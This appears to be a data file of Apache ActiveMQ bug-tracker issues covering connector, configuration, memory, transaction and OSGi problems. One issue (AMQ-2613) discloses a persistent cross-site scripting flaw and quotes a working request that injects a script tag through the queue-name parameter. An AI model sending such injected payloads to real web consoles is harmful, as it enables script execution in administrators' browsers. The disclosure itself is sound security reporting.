texts:Configuring HTTP <networkConnector> with proxyHost, proxyPort results in "Invalid connect parameters: {proxyPort=nn)}" error
I"m trying to set up a forwarding bridge that will connect through an http proxy (where the proxy happens to be running on the same machine as the destination ApacheMQ instance). Per AMQ-1099, the following should work: <networkConnector name="gstest-252" uri="static://(http://gstest-252:61617?proxyHost=gstest-252&amp;proxyPort=80)" networkTTL="5"/>  But it results in the following error at start up: INFO | Establishing network connection from vm://localhost to http://gstest-252:61617?proxyHost=gstest-252&proxyPort=80&proxyHost=gstest-252&proxyPort=80) WARN | Could not connect to remote URI: http://gstest-252:61617?proxyHost=gstest-252&proxyPort=80&proxyHost=gstest-252&proxyPort=80): Invalid connect parameters: {proxyPort=80)} INFO | Network Connector gstest-252 Started
issueID:AMQ-2599
type:Bug
changed files:
texts:Distribution activemq.xml does not match distribution activemq.xsd, causing SAXParseException with newer versions of Spring
In the 5.3.0 distribution, an "activemq.xml" file is provided in the "conf" directory.  The format of this file does not match the schema "activemq.xsd" that is located in the activemq-core-5.3.0.jar.  Specifically, in the latter, the "broker" tag is defined as a sequence of tags as follows: adminView applicationContext consumerSystemUsage destinationFactory destinationInterceptors destinationPolicy destinations jmsBridgeConnectors managementContext messageAuthorizationPolicy networkConnectorURIs networkConnectors persistenceAdapter persistenceFactory persistenceTaskRunnerFactory plugins producerSystemUsage proxyConnectors regionBroker services sslContext systemUsage taskRunnerFactory tempDataStore transportConnectorURIs transportConnectors(suspiciously, these tags are listed in alphabetical order - I question whether "sequence" was the correct type in the xsd, as opposed to "one or more of the following")In any event, in the "activemq.xml" that is provided as part of the distribution, the children of the "broker" tag are provided in the following order: managementContext persistenceAdapter destinationPolicy systemUsage transportConnectorsIf the activemq.xsd file is correct, then "destinationPolicy" should have been positioned first - before "managementContext".  Alternately, the tag order in the xsd file needs to be reworked.This problem causes a SAXParseException if one tries to use the default activemq.xml with Spring 3.0 jars used instead of the Spring 2.5.6 jars that come with the distribution.  I can only presume that the newer version of Spring is configured, by default, to validate parsed XML against the XSD, while Spring 2.5.6 is not.I note that http://activemq.apache.org/networks-of-brokers.html indicates "Order of construction of networks/persistence/transports IS important!"  This at least suggests to me that the ordering of other tags might possibly be important, or that multiple orders may be valid depending on the desired effect.  Thus, it is not immediately obvious which of the two files is, in fact, the correct one.Regardless, it seems that the example XML file should match the provided XSD file.The current workaround is to either use a version of Spring earlier than 3, or to edit the activemq.xml to re-order the children of "broker".
issueID:AMQ-2600
type:Improvement
changed files:
texts:Upgrade to Jetty 7
Upgrade to Jetty 7.0.1 for a web socket support
issueID:AMQ-2601
type:Improvement
changed files:pom.xml
Activator.java
texts:Make amq blueprint friendly
Geronimo would like to run activemq under osgi blueprint rather than spring, using xbean-blueprint (not yet released).  To do this we need to reduce the compilation dependencies on spring classes.  Fortunately for the classes needed for blueprint, the spring dependencies are the moderately obsolete lifecycle interfaces that can be repaced by common annotations PostContstruct and PreDeploy and the xbean javadoc annotations InitMethod and DestroyMethod.  While xbean-spring does not recognize the common annotations, it does recognize the javadoc annotations.  So...xbean-spring plans will see the javadoc annotations and workplain spring plans will see the common annotations and workxbean-blueprint plans will see both and work.I"ve included the geronimo annotation jar in the build and activemq-all assembly so this should work on java 5 as well as 6 (where they are included in the jdk).In addition, to run under osgi, the org.apache.activemq.util.osgi.Activator needs to be installed.  Since it might conceivably be disruptive to put this in as the activem-core bundle activator, I"ve modified it so it can be installed as a blueprint bean.
issueID:AMQ-2602
type:Improvement
changed files:
texts:Avoid activemq osgi bundles to import their own packages
None
issueID:AMQ-2603
type:Bug
changed files:
texts:Maven dependency:tree for ActiveMQ 5.3.0 seems to show conflicts about geronimo-j2ee-management jars
My original post on http://old.nabble.com/Question-about-ActiveMQ-5.3.0-maven-dependencies-td27556755.html#a27561913 was:When I run maven for a dependency:tree of activemq-core-5.3.0, I get this: &#91;INFO&#93; &#45; org.apache.activemq:activemq-core:jar:5.3.0:compile &#91;INFO&#93;    +- commons-logging:commons-logging-api:jar:1.1:compile &#91;INFO&#93;    +- org.apache.geronimo.specs:geronimo-jms_1.1_spec:jar:1.1.1:compile &#91;INFO&#93;    +- org.apache.activemq:activeio-core:jar:3.1.2:compile &#91;INFO&#93;    |  +- org.apache.geronimo.specs:geronimo-j2ee-management_1.1_spec:jar:1.0.1:compile &#91;INFO&#93;    |  &#45; commons-logging:commons-logging:jar:1.1:compile &#91;INFO&#93;    |     +- log4j:log4j:jar:1.2.12:compile &#91;INFO&#93;    |     +- logkit:logkit:jar:1.0.1:compile &#91;INFO&#93;    |     +- avalon-framework:avalon-framework:jar:4.1.3:compile &#91;INFO&#93;    |     &#45; javax.servlet:servlet-api:jar:2.3:compile &#91;INFO&#93;    +- org.apache.activemq:kahadb:jar:5.3.0:compile &#91;INFO&#93;    +- org.apache.activemq.protobuf:activemq-protobuf:jar:1.0:compile &#91;INFO&#93;    +- org.apache.geronimo.specs:geronimo-j2ee-management_1.0_spec:jar:1.0:compile &#91;INFO&#93;    +- org.springframework:spring-context:jar:2.5.6:compile &#91;INFO&#93;    |  +- aopalliance:aopalliance:jar:1.0:compile &#91;INFO&#93;    |  +- org.springframework:spring-beans:jar:2.5.6:compile &#91;INFO&#93;    |  &#45; org.springframework:spring-core:jar:2.5.6:compile &#91;INFO&#93;    &#45; commons-net:commons-net:jar:2.0:compile Now, I am wondering about the two jars: geronimo-j2ee-management_1.0_spec:jar:1.0 geronimo-j2ee-management_1.1_spec:jar:1.0.1 Don"t they overlap/conflict? Answer on the forum from Gary Tully:This is still the situation on trunk. Can you raise a jira issue to track this? We should exclude the activeio transitive dependency or update to the 1.0.1 version for activemq. I have not seen any report of the jars clashing or causing problems, either they are compatible or the activeio management dependency is not called on at runtime if a journaled persistence adapter is used. So there we are. Thanks.
issueID:AMQ-2604
type:Bug
changed files:LoggingBrokerPlugin.java
texts:LoggingBrokerPluggin doesn&#39;t log to the DLQ
The LoggingBrokerPlugin fails to pass messages to a DLQ - this looks like an omission -  see http://old.nabble.com/LoggingBrokerPlugin-and-DLQ-td27588791.html
issueID:AMQ-2607
type:Bug
changed files:
texts:TransportConnector] Connector vm://null should contain broker name
the url I am using isvm:(broker:(tcp://localhost:61616)/myBroker?persistent=false)when to connector starts it says2010-02-12 18:38:24,204 INFO &#91;TransportConnector&#93; Connector vm://null Startedinstead of2010-02-12 18:38:24,204 INFO &#91;TransportConnector&#93; Connector vm://myBroker Startedresolution: Hi,class VMTransportFactory on method doCompositeConnect line 70 if (brokerData.getPath() != null) {               host = data.getPath();           }shouldn"t it beif (brokerData.getPath() != null) {               host = brokerData.getPath();           }see: http://old.nabble.com/is-this-a-bug---tp27544304p27544304.html
issueID:AMQ-2608
type:Bug
changed files:IntrospectionSupport.java
texts:Locale dependent toUpperCase in IntrospectionSupport.
The org.apache.activemq.util.IntrospectionSupport.findSetterMethod uses name.substring(0, 1).toUpperCase(). What is local dependent. For example in turkish locale we won"t get setter for "initialReconnectDelay", because the uppercase of "i" is not "I". I would suggest using Character.toUpperCase(name.charAt(0)) what is local independent.
issueID:AMQ-2610
type:Bug
changed files:
texts:expiry processing with file pending cursor and no consumers fills memory - causing producerFlowControll to kick in
The Memory usage limits are shared for a filependingmessagecursor and a queue. To have the cursor limit kick in first the usage portion needs to be reduced to below 70% as in: policy.setCursorMemoryHighWaterMark(50); for the destination.This causes message references to be flushed to disk when the memory utilization reaches 50% ensuring that the memory usage limit for the queue of 70% is not met.However, expiry processing with no consumers, needs to go directly to the cursor to examine messages (as none are paged in for dispatch) and this contract is problematic at the moment as there is no way to manage the message reference count via the cursor api for this use case. PageInList is promising but not complete.
issueID:AMQ-2611
type:Bug
changed files:
texts:Stopping camel context with ActiveMQComponent does not close connections to ActiveMQ
Stopping a camel context that uses an ActiveMQComponent does not appear to close connections to the ActiveMQBroker.  See the attached test case as an example.  It creates a camel context containing an ActiveMQ consumer and producer, sends a message, then destroys the context.  The test case does this in a loop so every 4 seconds the old camel context is destroyed and a new one is created.  Every second the test outputs the number of connections to the ActiveMQ broker.  This number continually grows over time.  After running for a few minutes I see output like this:10:17:28,885 INFO  ActiveMQTest - num connections = 15910:17:29,885 INFO  ActiveMQTest - num connections = 15910:17:30,574 INFO  ActiveMQTest - creating context and sending message10:17:30,574 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) is starting10:17:30,574 INFO  DefaultCamelContext - JMX enabled. Using DefaultManagedLifecycleStrategy.10:17:30,744 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) started10:17:30,753 INFO  ActiveMQTest - consume message = message10:17:30,885 INFO  ActiveMQTest - num connections = 16010:17:31,885 INFO  ActiveMQTest - num connections = 16010:17:32,747 INFO  ActiveMQTest - destroying context10:17:32,747 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) is stopping10:17:32,755 INFO  DefaultInflightRepository - Shutting down with no inflight exchanges.10:17:32,755 INFO  DefaultCamelContext - Apache Camel 2.1.0-psc-01-00RC1 (CamelContext:camel-160) stopped10:17:32,886 INFO  ActiveMQTest - num connections = 16010:17:33,885 INFO  ActiveMQTest - num connections = 160Also if I do "netstat -an | grep 61616" I see the number of connections to the broker on TCP port 61616 is continually growing.
issueID:AMQ-2613
type:Bug
changed files:
texts:Persistent Cross-site Scripting in /createDesitnation.action [JMSDestination parameter]
GET /createDestination.action?JMSDestinationType=queue&JMSDestination=%22%3E%3Cscript%3Ealert%28%22persistent%20XSS%22%29%3C%2fscript%3EThis GET request creates a queue name that has malformed queue name due to lack of input validation.  After sending this request a sample of the effect can be seen by browsing to /queues.jsp and clicking on the "Home" link.  I do not know the affected version information yet.  Is there some way I can find it?    Additionally, this is vulnerable to cross-site request forgery as well but XSS is a more critical bug than XSRF (at least at this point for me I guess).CVE Identifier issued for this:CVE-2010-0684
issueID:AMQ-2616
type:Bug
changed files:
texts:filling a temporary queue and disconnecting does not free the queues Usage Manager memory limit
Starting a broker running the latest 5.3.1 snapshot with the simple attached configuration, then connecting a producer that sends messages to a temporary queue (without any consumer on it) until it hits the Usage Manager memory limit and gives this message:INFO  Topic - Usage Manager memory limit reached for temp-topic://ID:sts-chc-matsh-33157-1266457317460-0:0:1. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more infoIf you then disconnect the producer you get a log message that the temporary queue is being removed, but if you connect another producer and try to produce to a new temporary queue no messages are accepted, and the broker just prints the "Usage Manager memory limit reached" message again. This is a denial of service since if you now connect a consumer on a new temporary queue no messages will be accepted for that temporary queue.
issueID:AMQ-2617
type:New Feature
changed files:
texts:Implement ws (WebSocket) transport
A new transport should allow clients to connect using HTML5 WebSockets and use Stomp as wire format
issueID:AMQ-2620
type:Improvement
changed files:
texts:Make KahaDB the default persistent store for ActiveMQ
Now KahaDB out performs AMQMessageStore, as well as scaling much better, its time to make it the default persistent store for ActiveMQ
issueID:AMQ-2622
type:Bug
changed files:
texts:ObjectMessage is [still] being serialized and de-serialized when using setObjectMessageSerializationDefered and setCopyMessageOnSend in local vm:// scenario
I have outlined the problem in the following forum link: http://old.nabble.com/URGENT-QUESTION:-AMQ-5.3.0-bug-or-configuration-error------ObjectMessage-is--still--being-serialized-when-using-setObjectMessageSerializationDefered-and-setCopyMessageOnSend-td27654579.htmlI have not created a JUnit test that demonstrates this, but here are the basic steps to reproduce this: create an embedded broker with no persistence, dedicatedTaskRunner = false, and optimizedDispatch = true create the ActiveMQConnectionFactory and set the setObjectMessageSerializationDefered = TRUE and setCopyMessageOnSend = FALSE create your connection from the factory create a producer and &#91;MessageListener&#93; consumer against a Queue create your own custom java object that implements Externalizable - this is important, because you will be able to set a breakpoint in the readExternal and writeExternal methods to see the 2 locations on the AMQ code where the message is copied - causing a serialization/de-serialization create a new ObjectMessage and send it from the producer to the consumerThe message will get serialized in ActiveMQConnection.java on this line &#91;msg = msg.copy();&#93; - see the linked forum issue for the code snippet and line numbers. NOTE: you will need to continue stepping the code through the complete dispatch process because it will go through a de-serialization phase as well when the call to getObject is called in the onMessage of the MessageListener.Please let me know if I can provide any more details - OR, if I"m not setting something properly to keep the ObjectMessage from being serialized.Thanks,Bob
issueID:AMQ-2623
type:Improvement
changed files:
texts:Upgrade woodstox version in activemq-xmpp
Was looking to get activemq-xmpp working with Adium, during the course of this I noticed that this component is using a pretty old version of woodstox, so updated that and tidied up the dependencies, also ensured that woodstox and stax2 is included in the distribution.  Let me know if there"s any issues!
issueID:AMQ-2626
type:Bug
changed files:
texts:Topic Memory usage creep with constant pending message strategy and a file pending message cursor
Topic subs with pending messages, where prefetch is limited and consumer is slow  can lead to memory usage creep when the eviction policy kicks in and needs to spool messages from disk as the system usage limit has been reached.
issueID:AMQ-2628
type:Bug
changed files:
texts:Advisory for discarded should indicate the consumer id that missed the message to allow correlation of missed messages with DLQ for example
Messages are discarded and there an optional advisory but just the message header is present in the payload. It is not possible to determine the consumer that missed the message. A non durable topic subscription id is needed in there.
issueID:AMQ-2630
type:Bug
changed files:
texts:NullPointerException in ActiveMQDestination (with patch)
The Oracle AQjmsDestination Object implements all the interfaces:AQjmsDestination <-Queue<-Destination <-TemporaryQueue<-Queue<-Destination <-TemporaryTopicTopic<-Destination <-Topic<-DestinationThe function ActiveMQDestination.transform fails to indicate the type of the Destination Object right, because it implements all Interfaces.When the Object its a Topic in reality, the        if (dest instanceof TemporaryQueue) {            return new ActiveMQTempQueue(((TemporaryQueue)dest).getQueueName());        }thinks its a TemporaryQueue.This causes the following stacktrace:java.lang.NullPointerException at org.apache.activemq.command.ActiveMQDestination.setPhysicalName(ActiveMQDestination.java:208) at org.apache.activemq.command.ActiveMQTempDestination.setPhysicalName(ActiveMQTempDestination.java:63) at org.apache.activemq.command.ActiveMQDestination.<init>(ActiveMQDestination.java:77) at org.apache.activemq.command.ActiveMQTempDestination.<init>(ActiveMQTempDestination.java:39) at org.apache.activemq.command.ActiveMQTempQueue.<init>(ActiveMQTempQueue.java:35) at org.apache.activemq.command.ActiveMQDestination.transform(ActiveMQDestination.java:121) at org.apache.activemq.command.ActiveMQMessage.setJMSDestination(ActiveMQMessage.java:222) at org.apache.activemq.network.jms.TopicBridge.sendMessage(TopicBridge.java:91) at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:146) at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1088) at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:127) at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:197) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2632
type:Improvement
changed files:
texts:Update client connections with information about a cluster of networked brokers
Currently it is up to the client to decide which broker(s) it should connect to. It would be beneficial to allow clients to be informed of brokers joining/leaving a cluster of networked brokers, and optionally load balance across them.
issueID:AMQ-2635
type:Improvement
changed files:
texts:Add setClientInternalExceptionListener to ActiveMQConnectionFactory
We have registered a durable topic consumer using  org.springframework.jms.listener.DefaultMessageListenerContainer.  When the server is shut down or becomes unavailable we would like the consumer to be notified in some way.  Currently there is an exception logged in activemq on level debug but the consumer is not aware that the server is no longer available.  Is it possible to propogate this exception back through spring or register somehwere in activeMQ to capture this "server unavailable" event?Client is linux activemq 5.2, spring 2.5.  Server is linux activemq 5.3Here is the client log when the server is stopped.2010-03-02 17:07:31,063 &#91;taskExecutor-1&#93; DEBUG 2010-03-02 17:07:32,063 &#91;taskExecutor-1&#93; DEBUG org.springframework.jms.listener.DefaultMessageListenerContainer - Consumer [ActiveMQMessageConsumer { value=ID:lab-1-33000-1267511832426-0:2:1:1, started=true }] of session [PooledSession { ActiveMQSession {id=ID:lab-1-33000-1267511832426-0:2:1,started=true} }] did not receive a message2010-03-02 17:07:32,704 &#91;ActiveMQ Transport: tcp://localhost/127.0.0.1:61616&#93; DEBUG org.apache.activemq.ActiveMQConnection - Async exception with no exception listener: java.io.EOFExceptionjava.io.EOFException        at java.io.DataInputStream.readInt(DataInputStream.java:375)        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:210)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)        at java.lang.Thread.run(Thread.java:619)2010-03-02 17:07:32,706 &#91;ActiveMQ Connection Worker: tcp://localhost/127.0.0.1:61616&#93; DEBUG org.apache.activemq.transport.tcp.TcpTransport - Stopping transport tcp://localhost/127.0.0.1:616162010-03-02 17:07:33,063 &#91;taskExecutor-1&#93; DEBUG org.springframework.jms.listener.DefaultMessageListenerContainer - Consumer [ActiveMQMessageConsumer { value=ID:lab-1-33000-1267511832426-0:2:1:1, started=true }] of session [PooledSession { ActiveMQSession {id=ID:lab-1-33000-1267511832426-0:2:1,started=true} }] did not receive a messageetc. . .Spring durable topic registration<jms:listener-container connection-factory="jmsFactory"                                                        task-executor="taskExecutor"                                                        acknowledge="transacted"                                                        destination-type="durableTopic"                                                        client-id="DLT">                <jms:listener destination="logTopic" ref="listener" subscription="durableLogTopic" /></jms:listener-container> ------Don"t think there is an easy way. You need to set aClientInternalExceptionListener on the underlying activemq connection, butthere is no easy way to set that via spring as there is no access to theconnection.One option would be to provide your own connection factory that can wrap anddelegate to the acivemq connectionfactory and set aclientInternalExceptionListener on each returned connection.From the implementation of the listener you can do what ever you need.Shared instances of transport and exception listeners are already exposed onthe connection factory, I think it would make sense to also add a sharedclientInternalExceptionListener option also.Could you open a jira issue to track this?
issueID:AMQ-2636
type:New Feature
changed files:
texts:Add support for setting the Differentiated Services or Type Of Service on outgoing TCP/IP packets to support Quality Of Service
It should be possible to specify the desired Differentiated Services class, as outlined in RFC 2475 (http://tools.ietf.org/html/rfc2475), or Type of Service value, on outgoing TCP/IP packets by specifying a diffServ or typeOfService Tcp Transport Option (http://activemq.apache.org/tcp-transport-reference.html).e.g. tcp://somehost:61616?trace=false&soTimeout=60000&diffServ=AF21e.g. tcp://somehost:61616?trace=false&soTimeout=60000&typeOfService=3I am part of a student group (http://maljub01.svnrepository.com/comp190/trac.cgi/wiki) at Tufts University that is implementing this functionality in ActiveMQ for potential use by MIT Lincoln Labs as part of the NextGen Network Enabled Weather Program (https://wiki.ucar.edu/display/NNEWD/The+NNEW+Wiki)..We would like to contribute our changes back to the ActiveMQ trunk, if possible. Attached is a initial patch against the 5.3.0 release version, which implements setting the Differentiated Services class via a Tcp Transport Option on the connection URI.Some notes about this approach:The basic underlying mechanism for actually setting the bits in the packet headers is the java.net.Socket.setTrafficClass method. This wasthe most elegant implementation out of all the possible implementations that we came up with.In order for setTrafficClass to work in JDK 6, it is necessary to set the System property java.net.preferIPv4Stack to be true. We found that this has precedent in ActiveMQ (http://activemq.apache.org/multicast-watch-out-for-ipv6-vs-ipv4-support-on-your-operating-system-or-distribution-or-network.html), but we are hoping that  this issue will be resolved in JDK 7, so that we can use the IPv6 stack when possible.In addition, the current implementation only sets the specified Differentiated Services bits on the outgoing packets, and has no control over the Acknowledgments sent back for those packets. We have yet to find an elegant and cross-platform way to have the ActiveMQ Broker find out what the Differentiated Services bits on the incoming packets are directly in Java, although we are considering approaches that would involve calling a shell script from TcpTransportServer that would utilize IPtables.We would like to know if might be interested in accepting this work into the ActiveMQ trunk. The sooner you let us know one way or another, the better, as this is a single-semester project.
issueID:AMQ-2637
type:Bug
changed files:
texts:More flexible osgi import version ranges
In geronimo we need a little wider version ranges in the osgi import-package headers.  For now I"m going to use a bnd pattern [==,)  that goes from the current minor import version to the next major version.  I"m also including configuration that will work with the next maven-bundle-plugin so that implemented packages have a smaller version range [==,=) that goes to the next minor version (this is what is used everywhere now).
issueID:AMQ-2638
type:Bug
changed files:
texts:Upgrade to apache 7 pom, use more standard release profile
Apache 7 pom now has a working apache-release profile, so we can use more of it.
issueID:AMQ-2643
type:Bug
changed files:
texts:Closing a PooledConnection does not seem to return associated sessions to the SessionPool
Reading the documentation at http://java.sun.com/j2ee/1.4/docs/api/javax/jms/Connection.html#close() one would assume the associated session(s) would be closed/returned to the SessionPool when closing a connection: "There is no need to close the sessions, producers, and consumers of a closed connection."But it seems if you don"t also explicitly call close() on the session you will run out of Session objects in the SessionPool. Looking at http://www.google.com/codesearch/p?hl=en#coOE0tRomSs/trunk/activemq-core/src/main/java/org/apache/activemq/pool/PooledConnection.java&d=9&l=69 trunk seems to have the same behaviour.
issueID:AMQ-2645
type:Bug
changed files:ActiveMQConnection.java
texts:Deadlock during FailoverTransport interruption
Here is my scenario:1) Two AMQ servers setup with shared persistence storage (replicated message store)2) Single client constantly sends/receives small messages to/form one queue and uses single Connection with failover transport configured. The client code you can find here: AMQ-2512.3) After pushing several messages, shutdown active AMQ node - second one will kick in; client will successfully reconnect to this new active node; however it won"t be able to receive any message out of the queue. Following warning is also generated by the client every 15s: "WARNING: dispatch paused, waiting for outstanding dispatch interruption processing (20) to complete..".During debugging I"ve found that code which is supposed to clean messages during reconnection await for MessageDispatchChannel mutex owned by one of the session threads (screenshot-1). This session thread, from the other hand, is in the middle of send operation and waits for server"s response. In result messages dispatch awaits infinitely on CountDownLatch which is supposed to be decremented by the deadlocked messages cleaning code (screenshot-2).This occurs in the latest 5.3.1-SNAPSHOT as well as in 5.3.0-fuse-01-00 version.
issueID:AMQ-2646
type:Improvement
changed files:
texts:Support Schedule and Delay properties in Stomp headers
following http://activemq.apache.org/delay-and-schedule-message-delivery.html I tried to delay a message using a AMQ_SCHEDULED_DELAY header property.The Stomp frames look like this:send:CONNECTreceived:CONNECTEDsession:ID:mj-PC-49610-1268150511998-3:10send:SUBSCRIBEdestination:/queue/Habariack:autoid:{AD4DFED5-B508-41B6-9AE2-F43E890A2522}send:SENDdestination:/queue/HabariAMQ_SCHEDULED_DELAY:2000test msg&#8211; After the SEND message, the broker interrupts the connection. If I remove the header property, the broker sends the message immediately as usual. So I guess that the Stomp code handles the new header property in an unexpected way. If I find the time I"ll have a look at the source code.See also:  "Delay messages with Stomp: broker resets connection when AMQ_SCHEDULED_DELAY header is specified "http://old.nabble.com/Delay-messages-with-Stomp%3A-broker-resets-connection-when-AMQ_SCHEDULED_DELAY-header-is-specified-td27837862.html
issueID:AMQ-2651
type:Bug
changed files:
texts:prefetchExtension off-by-1 for transacted consumers with prefetchSize > 0
Linked to forum discussion: http://old.nabble.com/prefetchExtension-off-by-1-for-transacted-consumers-with-prefetchSize-%3E-0-ts27866123.htmlHi,I"ve searched the forum and JIRA and have noticed that the prefetchExtension in PrefetchSubscription has caused grief before.  However, I think there"s still a problem.First, I understand the purpose of the prefetchExtension for the case when prefetchSize = 0.  It allows messages to be dispatched to the consumer when the consumer requests them (i.e. polls them).  However, I don"t really understand the purpose of the prefetchExtension for the cases when prefetchSize > 0.  If the consumer has set the prefetchSize to x, shouldn"t it always receive only x messages at a time?  Why is the prefetchSize being extended?  I see that it is only extended in the case when the message delivery is transacted but I still don"t understand why this is necessary.In any case, assuming the prefetchExtension is necessary in the case of prefetchSize > 0 and transacted message delivery, I think the calculation of the prefetchExtension in this case has an off-by-1 error.  I am attaching a junit test that illustrates this problem.The test is basically acting like a JCA Resource Adapter and sets up an asynchronous message listener by creating a ConnectionConsumer with a maxMessages value of 1.  This translates into a PrefetchSubscription with a prefetchSize of 1.  The test then sends 3 messages.  The purpose of the 1st message is to trigger the prefetch extension logic in PrefetchSubscription upon the message"s ack.  When this happens, the prefetchExtension is set to 1 and the prefetchSize essentially becomes 2.  I believe this is incorrect and is the off-by-1 error (assuming the prefetchExtension is required at all in this case).  The 2nd message is simulated to be a long running message so that when the 3rd message is dispatched, the 2nd message is still being processed.  When the 3rd message is dispatched, because the prefetchSize has been extended, it will try to deliver it even though the processing of the 2nd message has not been completed and even though maxMessages on the ConnectionConsumer was specified as 1.Now, if I only have 1 ServerSession in the ServerSessionPool, this behavior seems to violate the JMS Spec since the maxMessages parameter used during ConnectionConsumer creation is defined as "the maximum number of messages that can be assigned to a server session at one time" and ActiveMQ is trying to assign 2 messages to the same ServerSession at the same time.
issueID:AMQ-2654
type:Bug
changed files:ManagedRegionBroker.java
texts:Space character inserted before subscriptionID in durable subscription info
When you check out the ObjectName of a durable subscription there"s a space between "Durable" and subscriptionID:org.apache.activemq:BrokerName=localhost,Type=Subscription,persistentMode=Durable, subscriptionID=James,destinationType=TopicThis patch removes that space.
issueID:AMQ-2656
type:Bug
changed files:
texts:ActiveMQInitialConnectionFactory cannot return an XAConnectionFactory
ActiveMQInitialContextFactory cannot resolve the name "XAConnectionFactory"  a la:INFO: JNDI API lookup failed: javax.naming.NameNotFoundException: XAConnectionFactoryThis prevents using the builtin JNDI service in an XA transaction context.  I"ve created a simple patch to workaround this and discussed it on the mailing list:  http://old.nabble.com/ActiveMQ%27s-JNDI-does-not-resolve-XAConnectionFactory-td27936255.html
issueID:AMQ-2659
type:Bug
changed files:
texts:JMSException incorrectly thrown when using XAConnection/XASession outside a transaction
Currently, if one attempts to use an XAConnection (implemented by ActiveMQXAConnection) and consequently an XASession (implemented by ActiveMQXASession) outside a transaction, a JMSException is thrown.  However, nowhere in the JMS Spec does it say that if an XAConnection/XASession is used, it must be enlisted in a transaction.  It is perfectly legal to not start a transaction but still use the XA objects.I propose that the following 2 methods in ActiveMQXASession be changed as follows to resolve this bug:    public boolean getTransacted() throws JMSException {        return getTransactionContext().isInXATransaction();    }    /**     * This is called before transacted work is done by the session.     * XA transactions are controlled outside of the session so     * nothing has to be done here.  The only reason for this method     * to be here is to override the parent.     */    protected void doStartTransaction() {    }The current version of these methods is as follows (for reference):    public boolean getTransacted() throws JMSException {        return true;    }    /**     * This is called before transacted work is done by     * the session.  XA Work can only be done when this     * XA resource is associated with an Xid.     *     * @throws JMSException not associated with an Xid     */    protected void doStartTransaction() throws JMSException {        if (!getTransactionContext().isInXATransaction()) {            throw new JMSException("Session"s XAResource has not been enlisted in a distributed transaction.");        }    }
issueID:AMQ-2662
type:Bug
changed files:ActiveMQEndpointWorker.java
texts:ActiveMQEndpointWorker.stop() sometimes is needing many minutes to shutdown
On shutdowns the threads occasionally are waiting for a long time in ActiveMQEndpointWorker.stop() on the field ActiveMQEndpointWorker.shutdownMutex. The cause is that shutdownMutex is a string constant (initialization line is shutdownMutex = "shutdownMutex"), effectively making it a global lock.The hangs are happening especially on servers with high traffic.
issueID:AMQ-2663
type:Bug
changed files:
texts:Failed durable subscription re-activation when keepDurableSubsActive=false
If i set keepDurableSubsActive=false then i won"t get the messages after re-activation. I"ve figured out that the DurableTopicSubscription.deactivate() invokes StoreDurableSubscriberCursor.remove() what is removes the TopicStorePrefetch from the topic. Up to this point everyting is fine. But when the durable subscription becomes active the StoreDurableSubscriberCursor.add won"t be called. So DurableTopicSubscription.activate() does not put the cursor back.
issueID:AMQ-2665
type:Bug
changed files:
texts:Durable subscription re-activation failed when keepDurableSubsActive=true.
If the keepDurableSubsActive=true in the broker and there are pre-created topics (at startup) in the config xml, then every subscription re-activation increases the consumers list.
issueID:AMQ-2667
type:Improvement
changed files:
texts:Make fileserver app jetty-neutral
Currently the app uses some classes from jetty-util. Also, we"d want to trim the size of the war as it doesn"t need all these jars in the WEB-INF/lib folder.
issueID:AMQ-2668
type:New Feature
changed files:
texts:Allow setting storeUsage limit per individual queue/topic
At the moment it"s only possible to configure a storeLimit per broker.In some cases, you want to set an upper bound for an individual queue, to guarantee that there will be storage available for other queues.For example, consider a setup with a request queue, and a response queue, where both request and response messages are huge.In that situation, we want to set an overall store limit, to prevent flooding the filesystem.At the same time, we don"t want to allow the request queue to consume 100% of the broker store.For example, we"d like to define:total broker store limit: 20 GBqueue "request_queue" store limit: 15 GBqueue "response_queue" store limit: 5 GB
issueID:AMQ-2669
type:Bug
changed files:BrokerService.java
texts:Slave in shared filesystem master/slave setup reports Slave=false in JMX
If you set up a shared filesystem master/slave, start the master, start the slave and then point JConsole at the slave the "Slave" attribute of the broker mbean is set to "False", same as the master. So it"s not as straightforward as it should be to figure out via JMX whether or not an instance of the broker is a slave or not.
issueID:AMQ-2670
type:Bug
changed files:ActiveMQXAManagedConnectionFactory.java
texts:ClassCast Exception in JBoss when using XA
When deploying the rar under JBoss, the connectionfactory bound in de JNDI tree is always of type "ActiveMQConnectionFactory"., while it should be ActiveMQXAConnectionFactory (which implements XAConnectionFactory).I attached a new class that creates the correct type of factory, and this can be configured in the ra.xml (also attached).
issueID:AMQ-2675
type:Bug
changed files:
texts:UnsupportedOperationException in web admin when creating topic
When clicking on "Create topic" in web admin, HTTP 500 "Unsupported method type GET" error is generated.looking at diff of commit 915384,  activemq-web-console/src/main/webapp/topics.jsp on line 24 should read method="post".
issueID:AMQ-2677
type:Bug
changed files:ConnectionPool.java
texts:org.apache.activemq.pool.ConnectionPool should not set "started" flag if start() throws an exception
